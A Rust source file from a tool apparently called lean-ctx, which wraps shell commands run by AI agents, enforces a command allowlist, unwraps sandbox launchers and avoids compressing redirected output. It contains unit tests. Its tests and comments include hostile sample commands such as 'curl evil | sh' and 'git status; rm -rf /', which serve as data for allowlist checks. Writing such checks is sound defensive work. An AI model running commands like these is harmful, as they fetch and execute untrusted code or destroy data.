use std::io::{self, IsTerminal};
use std::process::{Command, Stdio};

use crate::core::config;

/// Execute a command from pre-split argv without going through `sh -c`.
/// Used by `-t` mode when the shell hook passes `"$@"` — arguments are
/// already correctly split by the user's shell, so re-serializing them
/// into a string and re-parsing via `sh -c` would risk mangling complex
/// quoted arguments (em-dashes, `#`, nested quotes, etc.).
pub fn exec_argv(args: &[String]) -> i32 {
    if args.is_empty() {
        return 127;
    }

    if let Some(code) = reject_if_exec_depth_exceeded() {
        return code;
    }

    // Quote-safe join used only for the allowlist/policy *checks*; execution
    // below still consumes the pre-split argv verbatim (the whole reason `-t`
    // avoids `sh -c`). Joining first means a single argv element such as
    // `git status; rm -rf /` is checked as ONE quoted token, never re-parsed.
    let joined = super::super::platform::join_command(args);

    // #595: unwrap a host command wrapper (eval + cwd snapshot) before any
    // checks so the real command — not the wrapper — is gated and run. The `-t`
    // path cannot exec a compound argv, so route the rebuild through `exec`.
    if let Some(u) = super::super::agent_wrapper::unwrap_agent_wrapper(&joined) {
        return exec(&u.rebuild());
    }

    // The `-t` track path is the agent's default shell hook
    // (`_lc() { lean-ctx -t "$@" }`), so it MUST enforce the same allowlist
    // boundary as `-c` (see `exec`). Previously it skipped the check entirely,
    // letting every aliased multi-arg invocation (`_lc git …`) bypass the
    // restriction that `lean-ctx -c` enforces (GH security audit, finding 1).
    if let Some(code) = allowlist_gate(&joined) {
        return code;
    }

    if super::super::reentry::should_pass_through() {
        return exec_direct(args);
    }

    let cfg = config::Config::load();
    let policy = super::super::output_policy::classify(&joined, &cfg.excluded_commands);

    if policy.is_protected() {
        let code = exec_direct(args);
        crate::core::tool_lifecycle::record_shell_command(0, 0);
        return code;
    }

    let code = exec_direct(args);
    crate::core::tool_lifecycle::record_shell_command(0, 0);
    code
}

/// Refuses to spawn another shell once nesting has gone past
/// [`super::super::reentry::MAX_EXEC_DEPTH`] — the last line of defense
/// against a runaway self-recursion loop (a shell hook re-firing inside a
/// shell lean-ctx itself spawned, see `reentry::stamp_exec_depth`) that would
/// otherwise fork-bomb the host.
///
/// Returns exit code 126, the same "not allowed" signal the shell-hook
/// wrappers already treat as "fall back to `command "$@"`" — so exceeding the
/// ceiling doesn't just stop lean-ctx, it makes the surrounding shell function
/// run the real command directly, which is what actually breaks the loop.
fn reject_if_exec_depth_exceeded() -> Option<i32> {
    if !super::super::reentry::exec_depth_exceeded() {
        return None;
    }
    eprintln!(
        "lean-ctx: refusing to nest further (depth >= {}) — a shell hook is re-firing inside a \
         command lean-ctx already spawned. Running the command raw instead of risking a \
         runaway process loop. If this persists, check for a duplicate/competing shell \
         integration that also wraps commands through lean-ctx.",
        super::super::reentry::MAX_EXEC_DEPTH
    );
    Some(126)
}

fn exec_direct(args: &[String]) -> i32 {
    let mut cmd = Command::new(&args[0]);
    cmd.args(&args[1..])
        .stdin(Stdio::inherit())
        .stdout(Stdio::inherit())
        .stderr(Stdio::inherit());
    super::super::reentry::mark_child(&mut cmd);
    super::super::platform::apply_utf8_locale(&mut cmd);
    let status = cmd.status();

    match status {
        Ok(s) => s.code().unwrap_or(1),
        Err(e) => {
            tracing::error!("lean-ctx: failed to execute: {e}");
            127
        }
    }
}

/// Decides whether an allowlist violation on the CLI path blocks (exit 126) or
/// only warns.
///
/// Enforced when:
/// - hook-child mode (`LEAN_CTX_HOOK_CHILD`): lean-ctx is the agent's
///   command-interception channel and must not be weaker than the MCP path, or
/// - stderr is not a TTY: a non-interactive caller is an agent or script, and
///   agent-driven `lean-ctx -c` must enforce the same boundary as ctx_shell.
///
/// Warn-only when a human runs `lean-ctx -c` at an interactive terminal (they
/// can run the command without lean-ctx anyway, so blocking adds friction, not
/// a boundary) or when `LEAN_CTX_ALLOWLIST_WARN_ONLY=1` explicitly opts out.
fn allowlist_must_enforce() -> bool {
    let hook_child = crate::core::runtime_flags::hook_child_enabled();
    let warn_only = std::env::var("LEAN_CTX_ALLOWLIST_WARN_ONLY")
        .is_ok_and(|v| v == "1" || v.eq_ignore_ascii_case("true"));
    allowlist_must_enforce_inner(hook_child, warn_only, io::stderr().is_terminal())
}

/// Pure decision core of [`allowlist_must_enforce`] (unit-testable without
/// process-global env/TTY state).
fn allowlist_must_enforce_inner(hook_child: bool, warn_only: bool, stderr_is_tty: bool) -> bool {
    if hook_child {
        return true;
    }
    if warn_only {
        return false;
    }
    !stderr_is_tty
}

/// True when this process's stdout is a **regular file** — i.e. the caller
/// redirected output to a file (`cmd > out`, `cmd >> out`).
///
/// Output captured to a file is consumed as *data*, so it must stay byte-faithful:
/// compression would silently drop/abbreviate lines and corrupt the file
/// (e.g. `git status --short > files.txt` losing entries). Pipes (agent capture)
/// and TTYs are NOT regular files and return `false`, so they keep their normal
/// behavior — this only ever *adds* a verbatim guarantee, never removes one.
///
/// Uses only `std`: it wraps the existing stdout descriptor in a `ManuallyDrop`
/// `File` purely to read its metadata (`fstat` on Unix, `GetFileInformation` on
/// Windows) without ever closing the real stdout.
fn stdout_is_regular_file() -> bool {
    #[cfg(unix)]
    {
        use std::os::unix::io::{AsRawFd, FromRawFd};
        let fd = io::stdout().as_raw_fd();
        // SAFETY: fd 1 stays valid for the whole process. `ManuallyDrop` prevents
        // the wrapper's `Drop` from closing stdout; we only read metadata.
        let file = std::mem::ManuallyDrop::new(unsafe { std::fs::File::from_raw_fd(fd) });
        file.metadata().is_ok_and(|m| m.is_file())
    }
    #[cfg(windows)]
    {
        use std::os::windows::io::{AsRawHandle, FromRawHandle};
        let handle = io::stdout().as_raw_handle();
        // SAFETY: the stdout handle stays valid for the whole process.
        // `ManuallyDrop` prevents the wrapper's `Drop` from closing it.
        let file = std::mem::ManuallyDrop::new(unsafe { std::fs::File::from_raw_handle(handle) });
        file.metadata().is_ok_and(|m| m.is_file())
    }
    #[cfg(not(any(unix, windows)))]
    {
        false
    }
}

/// Quote-aware check for stdout file redirects (`>`, `>>`) inside a command
/// string. Returns `true` when the command redirects to a real file (not
/// `/dev/null`, not `>&N` fd-duplication, not `2>`).
fn command_has_file_redirect(cmd: &str) -> bool {
    let bytes = cmd.as_bytes();
    let len = bytes.len();
    let mut i = 0;
    let mut in_single_quote = false;
    let mut in_double_quote = false;

    while i < len {
        let c = bytes[i];
        if c == b'\\' && !in_single_quote {
            i += 2;
            continue;
        }
        if c == b'\'' && !in_double_quote {
            in_single_quote = !in_single_quote;
        } else if c == b'"' && !in_single_quote {
            in_double_quote = !in_double_quote;
        } else if c == b'>' && !in_single_quote && !in_double_quote {
            if i > 0 && bytes[i - 1] == b'2' {
                i += 1;
                continue;
            }
            let target_start = if i + 1 < len && bytes[i + 1] == b'>' {
                i + 2
            } else {
                i + 1
            };
            let target: String = cmd[target_start..]
                .trim_start()
                .chars()
                .take_while(|c| !c.is_whitespace())
                .collect();
            if target == "/dev/null" || target == "/dev/stdout" || target == "/dev/stderr" {
                i += 1;
                continue;
            }
            if let Some(fd) = target.strip_prefix('&')
                && !fd.is_empty()
                && (fd == "-" || fd.chars().all(|c| c.is_ascii_digit()))
            {
                i += 1;
                continue;
            }
            if !target.is_empty() {
                return true;
            }
        }
        i += 1;
    }
    false
}

/// Shared allowlist gate for the CLI shell entrypoints — `-c` (via [`exec`]) and
/// `-t` (via [`exec_argv`]). Both must apply the SAME boundary so the track path
/// (the default shell hook) cannot be weaker than the compress path.
///
/// Returns `Some(126)` when the command is blocked and the caller must return
/// that exit code; `None` when execution may proceed (allowed, or warn-only for
/// an interactive human — see [`allowlist_must_enforce`]).
fn allowlist_gate(command: &str) -> Option<i32> {
    if let Err(msg) = crate::core::shell_allowlist::check_shell_allowlist(command) {
        if allowlist_must_enforce() {
            eprintln!("{msg}");
            eprintln!(
                "lean-ctx: command blocked by shell allowlist. \
                 Allow it permanently: lean-ctx allow <cmd> — or set \
                 LEAN_CTX_ALLOWLIST_WARN_ONLY=1 to downgrade to a warning."
            );
            return Some(126);
        }
        // Diagnostic, not user feedback: an interactive human at a TTY can run
        // the command without lean-ctx anyway, and surfacing a WARN in their
        // plain terminal is exactly the confusion GH #699 reported. Keep the
        // warning for non-TTY callers (agents that opted into warn-only).
        if io::stderr().is_terminal() {
            tracing::debug!("[CLI] Command would be blocked in MCP mode: {msg}");
        } else {
            tracing::warn!("[CLI] Command would be blocked in MCP mode: {msg}");
        }
    }
    None
}

pub fn exec(command: &str) -> i32 {
    if let Some(code) = reject_if_exec_depth_exceeded() {
        return code;
    }

    // #1834 (Path C): the host's OS-sandbox launcher (`env … sandbox-exec …
    // /bin/zsh -c '<Path B>'`, Claude Code `sandbox.enabled`). Unwrapping it
    // would run the real command outside the sandbox, and gating the launcher
    // as a whole hard-blocks every call on the inner `eval`. Gate the script
    // inside it here — exactly as Path A/B would — then run the launcher
    // verbatim. This gate is the one that counts: the inner shell may be bash,
    // which never reads `.zshenv`, so its re-entry is only for compression.
    // See `agent_wrapper::os_sandbox_launcher_argv`.
    if let Some(argv) = super::super::agent_wrapper::os_sandbox_launcher_argv(command) {
        if let Some(code) = allowlist_gate(&sandbox_launcher_gated_command(&argv)) {
            return code;
        }
        return exec_sandbox_launcher(&argv);
    }

    // #595: when the agent wraps its command in host scaffolding
    // (`… && eval '<cmd>' … && pwd -P >| …-cwd`), look through it so the allowlist
    // and compression act on the REAL command, not the wrapper — whose `eval` the
    // allowlist would otherwise hard-block on every single call. The cwd snapshot
    // is preserved so the host keeps tracking the working directory.
    let unwrapped = super::super::agent_wrapper::unwrap_agent_wrapper(command).map(|u| u.rebuild());
    let mut collapsed_nested = false;
    let collapsed;
    let command = unwrapped.as_deref().unwrap_or(command);
    let command = if let Some(c) = collapse_nested_lean_ctx_exec(command) {
        collapsed_nested = true;
        collapsed = c;
        collapsed.as_str()
    } else {
        command
    };

    if let Some(code) = allowlist_gate(command) {
        return code;
    }

    let (shell, shell_flag) = super::super::platform::shell_and_flag();
    let command = crate::tools::ctx_shell::normalize_command_for_shell(command);
    // #1286: keep the zsh preamble (`setopt nonomatch noequals; `) OUT of the
    // command string used for classification and compression — every
    // `starts_with("ls ")`/`git`-style pattern matcher silently stopped
    // matching under zsh (the default macOS shell), degrading pattern
    // compression to the generic terse fallback. The preamble is applied to
    // the SPAWNED command only, inside the exec helpers.
    let command = command.as_str();

    if super::super::reentry::is_disabled() {
        return exec_inherit(command, &shell, &shell_flag);
    }
    if should_delegate_wrapped_to_shell_default(collapsed_nested) {
        return exec_shell_default(command, &shell, &shell_flag);
    }

    let cfg = config::Config::load();
    let force_compress = crate::core::runtime_flags::compress_enabled();
    let raw_mode = crate::core::runtime_flags::raw_enabled();

    if raw_mode {
        return exec_inherit_tracked(command, &shell, &shell_flag);
    }

    let policy = super::super::output_policy::classify(command, &cfg.excluded_commands);

    // Passthrough: ALWAYS bypass compression, even with force_compress.
    if policy == super::super::output_policy::OutputPolicy::Passthrough {
        return exec_inherit_tracked(command, &shell, &shell_flag);
    }

    // Verbatim: bypass compression unless force_compress is set,
    // in which case use buffered path (compress_if_beneficial will
    // respect the verbatim classification and only size-cap).
    if policy == super::super::output_policy::OutputPolicy::Verbatim && !force_compress {
        return exec_inherit_tracked(command, &shell, &shell_flag);
    }

    if !force_compress {
        if io::stdout().is_terminal() {
            return exec_inherit_tracked(command, &shell, &shell_flag);
        }
        let code = exec_inherit(command, &shell, &shell_flag);
        crate::core::tool_lifecycle::record_shell_command(0, 0);
        return code;
    }

    // Compression is forced (`-c` / LEAN_CTX_COMPRESS, e.g. the agent shell hook).
    // It must STILL never alter bytes destined for a file: a redirect
    // (`cmd > out`, `cmd >> out`) means the output is captured as data, not read by
    // a human or agent. Writing the compressed digest there would silently
    // drop/abbreviate lines and corrupt the file (e.g. contradictory `git diff`
    // dumps). Pass redirected-to-file output through verbatim; pipes (agent
    // capture) and TTYs keep compressing. This is the single choke point, so it
    // holds for every caller (hook, direct CLI, Pi/MCP bridges).
    if stdout_is_regular_file() {
        return exec_inherit_tracked(command, &shell, &shell_flag);
    }

    // Also bypass compression when the redirect is INSIDE the command string
    // (e.g., `lean-ctx -c 'git show HEAD:f > out.md'`). In this case lean-ctx's
    // own stdout is a pipe (to the agent), but the shell child redirects its
    // stdout to the file. exec_buffered would capture empty/minimal output while
    // the file gets correct data — but the overhead is wasted and the compressed
    // empty output confuses agents. Let sh handle it natively. (#1303)
    if command_has_file_redirect(command) {
        return exec_inherit_tracked(command, &shell, &shell_flag);
    }

    super::super::pipeline::exec_buffered(command, &shell, &shell_flag, &cfg)
}

fn collapse_nested_lean_ctx_exec(command: &str) -> Option<String> {
    let mut current = command.trim().to_string();
    let mut changed = false;

    while let Some(next) = strip_one_lean_ctx_exec(&current) {
        if next == current {
            break;
        }
        current = next;
        changed = true;
    }

    changed.then_some(current)
}

fn should_delegate_wrapped_to_shell_default(collapsed_nested: bool) -> bool {
    // After collapsing `lean-ctx -c "lean-ctx -c ..."` the current process is the
    // one compression pass that would otherwise be owned by the shell default.
    // Delegating again would drop back to raw execution or re-enter the hook.
    super::super::reentry::is_wrapped() && !collapsed_nested
}

fn strip_one_lean_ctx_exec(command: &str) -> Option<String> {
    let words = split_simple_shell_words(command)?;
    if words.len() < 3 || !is_lean_ctx_bin(&words[0].value) {
        return None;
    }
    if words[1].value != "-c" && words[1].value != "exec" {
        return None;
    }
    if words[2..].iter().any(|w| {
        matches!(
            w.value.as_str(),
            "|" | "||" | "&" | "&&" | ";" | "<" | ">" | ">>"
        )
    }) {
        return None;
    }
    if words.len() == 3 {
        Some(words[2].value.trim().to_string())
    } else {
        Some(command[words[2].start..].trim().to_string())
    }
}

fn is_lean_ctx_bin(word: &str) -> bool {
    std::path::Path::new(word)
        .file_name()
        .and_then(|name| name.to_str())
        .is_some_and(|name| name == "lean-ctx" || name == "lean-ctx.exe")
}

struct SimpleShellWord {
    value: String,
    start: usize,
}

fn split_simple_shell_words(command: &str) -> Option<Vec<SimpleShellWord>> {
    let mut words = Vec::new();
    let mut current = String::new();
    let mut current_start: Option<usize> = None;
    let mut chars = command.char_indices().peekable();
    let mut quote: Option<char> = None;

    while let Some((idx, ch)) = chars.next() {
        match quote {
            Some('\'') if ch == '\'' => quote = None,
            Some('"') if ch == '"' => quote = None,
            None if ch == '\'' || ch == '"' => {
                current_start.get_or_insert(idx);
                quote = Some(ch);
            }
            Some('"') | None if ch == '\\' => {
                current_start.get_or_insert(idx);
                if let Some((_, next)) = chars.next() {
                    current.push(next);
                }
            }
            None if ch.is_whitespace() => {
                if let Some(start) = current_start.take() {
                    words.push(SimpleShellWord {
                        value: std::mem::take(&mut current),
                        start,
                    });
                }
            }
            Some(_) | None => {
                current_start.get_or_insert(idx);
                current.push(ch);
            }
        }
    }

    if quote.is_some() {
        return None;
    }
    if let Some(start) = current_start {
        words.push(SimpleShellWord {
            value: current,
            start,
        });
    }
    (!words.is_empty()).then_some(words)
}

/// What the allowlist sees for a sandbox launcher: the script it runs, looked
/// through the host scaffolding the same way [`exec`] does for Path A/B. A
/// script that is not host scaffolding is gated whole — its `eval` then blocks
/// exactly as it would without the sandbox.
fn sandbox_launcher_gated_command(argv: &[String]) -> String {
    let script = argv.last().map_or("", String::as_str);
    super::super::agent_wrapper::unwrap_agent_wrapper(script)
        .map_or_else(|| script.to_string(), |u| u.rebuild())
}

/// Spawn an OS-sandbox launcher argv as-is (Path C), without a shell in
/// between: a `zsh -c` hop here would re-read `.zshenv` with the same launcher
/// string and loop back into lean-ctx. The caller has already gated the
/// script. The re-entry guard the hook exported (`LEAN_CTX_ACTIVE`) and the
/// ownership marker are cleared so a zsh the launcher starts *inside* the
/// sandbox re-enters the hook for compression; the depth stamp still bounds
/// runaway nesting.
fn exec_sandbox_launcher(argv: &[String]) -> i32 {
    match sandbox_launcher_command(argv).status() {
        Ok(s) => s.code().unwrap_or(1),
        Err(e) => {
            tracing::error!("lean-ctx: failed to execute sandbox launcher: {e}");
            127
        }
    }
}

fn sandbox_launcher_command(argv: &[String]) -> Command {
    let mut cmd = Command::new(&argv[0]);
    cmd.args(&argv[1..])
        .stdin(Stdio::inherit())
        .stdout(Stdio::inherit())
        .stderr(Stdio::inherit());
    super::super::reentry::clear_shell_default_markers(&mut cmd);
    super::super::reentry::stamp_exec_depth(&mut cmd);
    super::super::platform::apply_utf8_locale(&mut cmd);
    cmd
}

fn exec_inherit(command: &str, shell: &str, shell_flag: &str) -> i32 {
    // #1286: the zsh preamble is applied at spawn time only, so `command`
    // stays clean for classification/compression upstream.
    let spawn_command = super::super::platform::zsh_safe_command(command, shell);
    let mut cmd = Command::new(shell);
    cmd.arg(shell_flag)
        .arg(&spawn_command)
        .stdin(Stdio::inherit())
        .stdout(Stdio::inherit())
        .stderr(Stdio::inherit());
    super::super::reentry::mark_child(&mut cmd);
    super::super::platform::apply_utf8_locale(&mut cmd);
    super::super::platform::apply_profile_free_env(&mut cmd);
    let status = cmd.status();

    match status {
        Ok(s) => s.code().unwrap_or(1),
        Err(e) => {
            tracing::error!("lean-ctx: failed to execute: {e}");
            127
        }
    }
}

fn exec_shell_default(command: &str, shell: &str, shell_flag: &str) -> i32 {
    let spawn_command = super::super::platform::zsh_safe_command(command, shell);
    let mut cmd = Command::new(shell);
    cmd.arg(shell_flag)
        .arg(&spawn_command)
        .stdin(Stdio::inherit())
        .stdout(Stdio::inherit())
        .stderr(Stdio::inherit());
    super::super::reentry::clear_shell_default_markers(&mut cmd);
    super::super::reentry::stamp_exec_depth(&mut cmd);
    super::super::platform::apply_utf8_locale(&mut cmd);
    super::super::platform::apply_profile_free_env(&mut cmd);
    let status = cmd.status();

    match status {
        Ok(s) => s.code().unwrap_or(1),
        Err(e) => {
            eprintln!("lean-ctx: failed to execute '{command}': {e}");
            127
        }
    }
}

fn exec_inherit_tracked(command: &str, shell: &str, shell_flag: &str) -> i32 {
    let code = exec_inherit(command, shell, shell_flag);
    crate::core::tool_lifecycle::record_shell_command(0, 0);
    code
}

/// Label inserted between stdout and stderr of a FAILED command so the agent can
/// attribute the error to the right stream instead of guessing — and never has to
/// re-run the command raw just to locate the failure. See #809 / #812.
pub(crate) const STDERR_LABEL: &str = "--- stderr ---";

/// Join captured stdout and stderr for display/recovery. On failure (non-zero
/// exit) with both streams present, a labeled delimiter separates them; success
/// output keeps the plain `stdout\nstderr` shape (determinism, #498).
pub(crate) fn combine_streams(stdout: &str, stderr: &str, exit_code: i32) -> String {
    match (stdout.is_empty(), stderr.is_empty()) {
        (_, true) => stdout.to_string(),
        (true, false) => stderr.to_string(),
        (false, false) if exit_code != 0 => format!("{stdout}\n{STDERR_LABEL}\n{stderr}"),
        (false, false) => format!("{stdout}\n{stderr}"),
    }
}

// Buffered command execution and output transformation live in `pipeline`.

#[cfg(test)]
mod nested_lean_ctx_exec_tests;

#[cfg(test)]
mod exec_tests {
    #[test]
    fn combine_streams_labels_stderr_on_failure() {
        let out = super::combine_streams("build ok", "linker: undefined symbol", 1);
        assert_eq!(
            out,
            format!(
                "build ok\n{}\nlinker: undefined symbol",
                super::STDERR_LABEL
            )
        );
    }

    #[test]
    fn combine_streams_plain_join_on_success() {
        let out = super::combine_streams("step 1", "warning: noop", 0);
        assert_eq!(out, "step 1\nwarning: noop");
        assert!(!out.contains(super::STDERR_LABEL));
    }

    #[test]
    fn combine_streams_single_stream_is_unchanged() {
        assert_eq!(super::combine_streams("only stdout", "", 1), "only stdout");
        assert_eq!(super::combine_streams("", "only stderr", 1), "only stderr");
    }

    #[test]
    fn exec_direct_runs_true() {
        let code = super::exec_direct(&["true".to_string()]);
        assert_eq!(code, 0);
    }

    #[test]
    fn exec_direct_runs_false() {
        let code = super::exec_direct(&["false".to_string()]);
        assert_ne!(code, 0);
    }

    #[test]
    fn exec_direct_preserves_args_with_special_chars() {
        let code = super::exec_direct(&[
            "echo".to_string(),
            "hello world".to_string(),
            "it's here".to_string(),
            "a \"quoted\" thing".to_string(),
        ]);
        assert_eq!(code, 0);
    }

    #[test]
    fn exec_direct_nonexistent_returns_127() {
        let code = super::exec_direct(&["__nonexistent_binary_12345__".to_string()]);
        assert_eq!(code, 127);
    }

    #[test]
    fn exec_argv_empty_returns_127() {
        let code = super::exec_argv(&[]);
        assert_eq!(code, 127);
    }

    #[test]
    fn exec_argv_runs_simple_command() {
        let _lock = crate::core::data_dir::test_env_lock();
        crate::test_env::remove_var("LEAN_CTX_HOOK_CHILD");
        crate::test_env::remove_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE");
        let code = super::exec_argv(&["true".to_string()]);
        assert_eq!(code, 0);
    }

    #[test]
    fn exec_argv_passes_through_when_disabled() {
        let _lock = crate::core::data_dir::test_env_lock();
        crate::test_env::remove_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE");
        crate::test_env::set_var("LEAN_CTX_DISABLED", "1");
        let code = super::exec_argv(&["true".to_string()]);
        crate::test_env::remove_var("LEAN_CTX_DISABLED");
        assert_eq!(code, 0);
    }

    // Finding 1 (GH security audit): the `-t` track path is the default shell
    // hook, so it must enforce the allowlist exactly like the `-c` path. A
    // non-allowlisted command must be blocked (126), not executed.
    #[test]
    fn exec_argv_enforces_allowlist_for_disallowed_command() {
        let _lock = crate::core::data_dir::test_env_lock();
        crate::test_env::remove_var("LEAN_CTX_ACTIVE");
        crate::test_env::remove_var("LEAN_CTX_DISABLED");
        crate::test_env::remove_var("LEAN_CTX_ALLOWLIST_WARN_ONLY");
        // hook-child forces enforcement regardless of the test runner's TTY state.
        crate::test_env::set_var("LEAN_CTX_HOOK_CHILD", "1");
        crate::test_env::set_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE", "git");

        // #1022: `true` is now a SHELL_BUILTIN (bypasses allowlist).
        // Use `xxd` which is a real binary and not in the override list.
        let code = super::exec_argv(&["xxd".to_string()]);

        crate::test_env::remove_var("LEAN_CTX_HOOK_CHILD");
        crate::test_env::remove_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE");

        assert_eq!(
            code, 126,
            "non-allowlisted command must be blocked on the -t track path"
        );
    }

    #[test]
    fn exec_argv_allows_allowlisted_command() {
        let _lock = crate::core::data_dir::test_env_lock();
        crate::test_env::remove_var("LEAN_CTX_ACTIVE");
        crate::test_env::remove_var("LEAN_CTX_DISABLED");
        crate::test_env::set_var("LEAN_CTX_HOOK_CHILD", "1");
        crate::test_env::set_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE", "true");

        let code = super::exec_argv(&["true".to_string()]);

        crate::test_env::remove_var("LEAN_CTX_HOOK_CHILD");
        crate::test_env::remove_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE");

        assert_eq!(code, 0, "allowlisted command must run on the -t track path");
    }
    // P0-1 (#413): the CLI allowlist must enforce for agents, warn for humans.
    #[test]
    fn allowlist_enforces_in_hook_child_mode() {
        // Hook-child wins over everything, even an interactive TTY.
        assert!(super::allowlist_must_enforce_inner(true, false, true));
        assert!(super::allowlist_must_enforce_inner(true, true, true));
    }

    #[test]
    fn allowlist_enforces_for_non_interactive_callers() {
        // Agent/script invocation: stderr is a pipe → enforce.
        assert!(super::allowlist_must_enforce_inner(false, false, false));
    }

    #[test]
    fn allowlist_warns_for_interactive_humans() {
        // Human at a TTY → warn-only (they can bypass lean-ctx anyway).
        assert!(!super::allowlist_must_enforce_inner(false, false, true));
    }

    #[test]
    fn allowlist_warn_only_opt_out_downgrades_non_interactive() {
        // Explicit LEAN_CTX_ALLOWLIST_WARN_ONLY=1 opt-out (but never in hook-child mode).
        assert!(!super::allowlist_must_enforce_inner(false, true, false));
        assert!(super::allowlist_must_enforce_inner(true, true, false));
    }

    // --- #1303: command_has_file_redirect ---

    #[test]
    fn redirect_to_file_detected() {
        assert!(super::command_has_file_redirect("git show HEAD:f > out.md"));
        assert!(super::command_has_file_redirect("git diff >> changes.log"));
        assert!(super::command_has_file_redirect(
            "git status > /tmp/status.txt"
        ));
    }

    #[test]
    fn no_redirect_not_detected() {
        assert!(!super::command_has_file_redirect("git status"));
        assert!(!super::command_has_file_redirect("cargo test --lib"));
    }

    #[test]
    fn dev_null_not_detected_as_redirect() {
        assert!(!super::command_has_file_redirect("cargo test > /dev/null"));
        assert!(!super::command_has_file_redirect("cmd > /dev/stdout"));
        assert!(!super::command_has_file_redirect("cmd > /dev/stderr"));
    }

    #[test]
    fn stderr_redirect_not_detected() {
        assert!(!super::command_has_file_redirect(
            "cargo test 2> errors.log"
        ));
        assert!(!super::command_has_file_redirect("cargo test 2>/dev/null"));
    }

    #[test]
    fn fd_dup_not_detected() {
        assert!(!super::command_has_file_redirect("cargo test 2>&1"));
        assert!(!super::command_has_file_redirect("cmd >&2"));
    }

    #[test]
    fn quoted_redirect_not_detected() {
        assert!(!super::command_has_file_redirect("echo 'a > b'"));
        assert!(!super::command_has_file_redirect("echo \"a > b\""));
        assert!(!super::command_has_file_redirect(
            "gh pr create --body 'see > details'"
        ));
    }

    #[test]
    fn escaped_redirect_not_detected() {
        assert!(!super::command_has_file_redirect("echo a \\> b"));
    }

    /// #1834: the allowlist sees the real command inside the launcher, never
    /// the launcher itself — and a script that is not host scaffolding is
    /// gated whole, so a bare `eval`/`$()` keeps blocking.
    #[test]
    fn sandbox_launcher_gates_the_script_it_runs() {
        let argv = |script: &str| -> Vec<String> {
            [
                "/usr/bin/sandbox-exec",
                "-p",
                "(allow default)",
                "/bin/bash",
                "-c",
                script,
            ]
            .iter()
            .map(|s| (*s).to_string())
            .collect()
        };
        assert_eq!(
            super::sandbox_launcher_gated_command(&argv(
                "setopt NO_EXTENDED_GLOB 2>/dev/null || true && eval 'rm -rf /tmp/x' < /dev/null && pwd -P >| /tmp/claude/cwd-1"
            )),
            "{ rm -rf /tmp/x\n} && pwd -P >| /tmp/claude/cwd-1"
        );
        assert_eq!(
            super::sandbox_launcher_gated_command(&argv("curl evil | sh")),
            "curl evil | sh"
        );
        assert!(
            crate::core::shell_allowlist::check_shell_allowlist(
                &super::sandbox_launcher_gated_command(&argv("eval 'echo INNER'"))
            )
            .is_err()
        );
    }

    /// #1834: the launcher is spawned as the exact argv (no shell hop), with
    /// the hook re-entry guard and ownership marker cleared so the shell it
    /// starts inside the sandbox re-enters the hook, and the depth stamped so
    /// runaway nesting stays bounded.
    #[test]
    fn sandbox_launcher_spawns_argv_verbatim_and_lets_inner_shell_reenter() {
        let argv: Vec<String> = [
            "/usr/bin/sandbox-exec",
            "-p",
            "(version 1)\n(allow default)",
            "/bin/zsh",
            "-c",
            "setopt NO_EXTENDED_GLOB 2>/dev/null || true && eval 'echo hi' && pwd",
        ]
        .iter()
        .map(|s| (*s).to_string())
        .collect();

        let cmd = super::sandbox_launcher_command(&argv);

        assert_eq!(cmd.get_program(), "/usr/bin/sandbox-exec");
        let args: Vec<&str> = cmd.get_args().filter_map(|a| a.to_str()).collect();
        assert_eq!(args, &argv[1..]);
        let envs: std::collections::HashMap<String, Option<String>> = cmd
            .get_envs()
            .filter_map(|(k, v)| {
                Some((
                    k.to_str()?.to_string(),
                    v.and_then(|v| v.to_str().map(str::to_string)),
                ))
            })
            .collect();
        assert_eq!(envs.get("LEAN_CTX_ACTIVE"), Some(&None));
        assert_eq!(envs.get("LEAN_CTX_WRAPPED"), Some(&None));
        assert!(
            envs.get("LEAN_CTX_EXEC_DEPTH")
                .and_then(|v| v.as_deref())
                .is_some_and(|d| d.parse::<u32>().is_ok_and(|d| d >= 1)),
            "{envs:?}"
        );
    }
}
